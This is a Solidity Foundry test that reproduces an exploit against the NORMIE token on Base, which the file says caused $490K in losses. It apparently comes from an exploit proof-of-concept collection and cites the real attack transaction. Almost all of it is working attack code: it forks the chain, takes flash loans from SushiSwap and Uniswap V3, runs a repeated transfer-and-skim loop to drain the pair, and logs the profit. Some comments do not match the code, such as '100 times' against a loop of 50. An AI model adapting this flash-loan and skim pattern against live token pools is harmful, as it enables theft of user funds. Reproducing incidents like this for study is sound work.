// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";
// @KeyInfo - Total Lost : 	$490K
// Attack Tx : https://app.blocksec.com/explorer/tx/base/0xa618933a0e0ffd0b9f4f0835cc94e523d0941032821692c01aa96cd6f80fc3fd

// Price : https://dexscreener.com/base/0x24605e0bb933f6ec96e6bbbcea0be8cc880f6e6f

// @Exploiter sent a message to Normie Deployer:
// https://basescan.org/tx/0x587f14b7ffb30b5013ab0db02e9bc94183817ef34c24a9595f33277e752f81eb

// @Info
// https://x.com/WuBlockchain/status/1794619680428282138
// https://x.com/lookonchain/status/1794680612399542672


contract ContractTest is Test {

    address SushiRouterv2 = 0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891;
    
    address SLP = 0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f;

    address UniswapV3Pool = 0x67ab0E84C7f9e399a67037F94a08e5C664DC1C66;

    address WETH = 0x4200000000000000000000000000000000000006;

    address NORMIE = 0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200;




    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/base", 14952783 - 1);

        uint256 ETH_balance_transfer_to_Zero_Address = address(this).balance - 3 ether ;

        payable(address(0)).call{value: ETH_balance_transfer_to_Zero_Address}("");
    }

    function testExploit() public {

        console.log("---------------------------------------------------");

        console.log("ETH Balance before this attack: ", address(this).balance / 1e18);

        console.log("---------------------------------------------------");

        // 1. Swap 2 ETH to NORMIE on SushiV2
        address[] memory path1 = new address[](2);

        path1[0] = WETH;
        path1[1] = NORMIE;

        Uni_Router_V2(SushiRouterv2).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 2 ether}(
            0,
            path1,
            address(this),
            block.timestamp
        );

        uint256 NORMIE_amount_after_swapping = IERC20(NORMIE).balanceOf(address(this));

        console.log("NORMIE amount after swapping", NORMIE_amount_after_swapping / 10 ** 9 );

        // 2. Flash Loan from SushiV2 Pair
        IUniswapV2Pair(SLP).swap(
            0,
            5000000000000000,
            address(this),
            hex"01"
        );


        // 4. Flash Loan from UniswapV3Pool

        Uni_Pair_V3(UniswapV3Pool).flash(
            address(this),
            0,
            11333141501283594,
            hex""
        );




    }


    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {

        // 3. Transfer all NORMIE to Pair

        uint256 NORMIE_amount_after_flashLoan_from_SushiV2 = IERC20(NORMIE).balanceOf(address(this));

        console.log("NORMIE amount after FlashLoan From SushiV2", NORMIE_amount_after_flashLoan_from_SushiV2  / 10 ** 9);

        IERC20(NORMIE).transfer(SLP, NORMIE_amount_after_flashLoan_from_SushiV2);

    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {

        // 5. Approve NORMIE to SushiRouterv2

        IERC20(NORMIE).approve(SushiRouterv2, type(uint256).max);


        address[] memory path2 = new address[](2);

        path2[0] = NORMIE;
        path2[1] = WETH;

        // 6. Swap 80% NORMIE to WETH on SushiV2

        Uni_Router_V2(SushiRouterv2).swapExactTokensForETHSupportingFeeOnTransferTokens(
            9066513201026875,
            0,
            path2,
            address(this),
            block.timestamp
        );

        // 7. Trasnfer remian NORMIE to slp

        uint256 NORMIE_amount_after_swap_from_SushiV2 = IERC20(NORMIE).balanceOf(address(this));

        console.log("NORMIE amount after swap From SushiV2", NORMIE_amount_after_swap_from_SushiV2  / 10 ** 9);

        IERC20(NORMIE).transfer(SLP, NORMIE_amount_after_swap_from_SushiV2);

        // 8 . Looping tranfer and skim for 100 times

        for (uint256 i; i < 50; ++i) {

            IUniswapV2Pair(SLP).skim(address(this));

            IERC20(NORMIE).transfer(SLP, NORMIE_amount_after_swap_from_SushiV2);

        }

        // 9. Skim but not tranfer again

        IUniswapV2Pair(SLP).skim(address(this));

        // 10. Swap 0.5 ETH to NORMIE on SushiV2

        address[] memory path1 = new address[](2);

        path1[0] = WETH;
        path1[1] = NORMIE;

        Uni_Router_V2(SushiRouterv2).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 2 ether}(
            0,
            path1,
            address(this),
            block.timestamp
        );

        // 11. Repay FlashLoan to UniV3Pool

        IERC20(NORMIE).transfer(UniswapV3Pool, 11446472916296430);

        // 12. Calcutelate Profit

        console.log("---------------------------------------------------");

        console.log("ETH Profit after this attack: ", address(this).balance / 1e18);

        console.log("---------------------------------------------------");

    }


    receive() external payable {}
}
